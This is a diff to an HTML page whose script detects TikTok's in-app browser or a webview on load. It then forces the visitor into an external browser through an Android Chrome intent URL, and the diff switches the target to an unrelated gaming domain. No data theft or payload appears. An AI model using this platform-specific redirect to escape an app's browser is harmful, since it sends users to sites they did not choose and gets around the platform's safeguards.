@@ -541,6 +541,7 @@
 
 
 
+<!-- Modal HTML -->
 <div id="custom-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
     <div class="bg-white rounded-lg p-6 max-w-md w-full mx-4 text-center">
         <h2 class="text-2xl font-bold mb-4">For a better experience, open in an external browser</h2>
@@ -548,20 +549,23 @@
         <p class="text-gray-700 mb-6">Here is how to open an external browser.</p>
     </div>
 </div>
+
+<!-- JavaScript code -->
 <script>
+    // Define all functions first
     function isTikTokBrowser() {
         const userAgent = navigator.userAgent.toLowerCase();
         return userAgent.includes('tiktok') || userAgent.includes('webview');
     }
-
+    
     function openInExternalBrowser() {
         const currentUrl = window.location.href;
         window.open(currentUrl, '_blank');
     }
-
+    
     function openLinkBasedOnDevice(url) {
         var userAgent = navigator.userAgent;
-
+        
         if (/(android)/i.test(userAgent)) {
             // If the device is Android, open the link in Chrome
             window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
@@ -573,18 +577,17 @@
             window.location.href = url;
         }
     }
-
+    
     // Execute when the page loads
     document.addEventListener('DOMContentLoaded', function() {
         if (isTikTokBrowser()) {
-            var url = 'https://americanfarming.vercel.app/';
+            var url = 'https://www.gameforyou.site';
             openLinkBasedOnDevice(url);
             // Show the modal
             document.getElementById('custom-modal').classList.remove('hidden');
         }
     });
 </script>
-
 
 
 
